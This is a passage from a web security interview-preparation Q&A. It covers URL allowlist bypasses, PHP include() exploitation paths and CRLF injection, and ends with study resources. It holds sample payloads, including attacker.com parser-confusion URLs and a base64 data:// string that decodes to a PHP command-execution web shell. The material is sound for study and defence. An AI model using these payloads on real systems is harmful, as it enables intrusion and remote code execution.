3. **Open redirect chaining** — Use a redirect to bypass URL allowlisting
4. **Double URL encoding** — Encode characters to bypass string matching filters
5. **URL parser confusion** — Use tricks like:
   - `https://legitimate@attacker.com`
   - `https://attacker.com#legitimate.com`
   - `https://legitimate.attacker.com`

---

## 60. PHP `include()` — Code Execution Paths

**Q:** Describe different ways a PHP `include()` could be exploited to gain code execution.

**A:**

1. **Local file inclusion** — Write PHP code to a local file, then include via path traversal or `file://`
2. **Remote file inclusion** — Host PHP code remotely and include via `http://`, `ftp://` (requires `allow_url_include=On`)
3. **`php://input`** — Read and execute raw PHP code from POST request body
4. **PHP filter chains** — Use `php://filter` to construct executable PHP code from existing files
5. **`data://` scheme** — Pass PHP code as plaintext or Base64: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`

---

## 61. CRLF Injection

**Q:** Explain how CRLF Injection works and describe possible exploitation methods.

**A:**

**CRLF Injection** occurs when `\r\n` (Carriage Return + Line Feed) characters can be injected into response headers, allowing attackers to insert new header lines.

**Exploitation:**

1. **Cookie injection** — Inject `Set-Cookie` headers to plant session tokens (prerequisite for Session Fixation)
2. **Header injection** — Insert arbitrary response headers
3. **Response splitting** — Inject `\r\n\r\n` to affect the response body, enabling:
   - XSS
   - Redirect to external site
   - Social engineering content injection

---

## 📚 Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/pentesting-web)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Tib3rius DOM Clobbering Cheatsheet](https://tib3rius.com/dom/)

---

*Questions originally by [Tib3rius](https://github.com/Tib3rius). Formatted for study and interview preparation.*
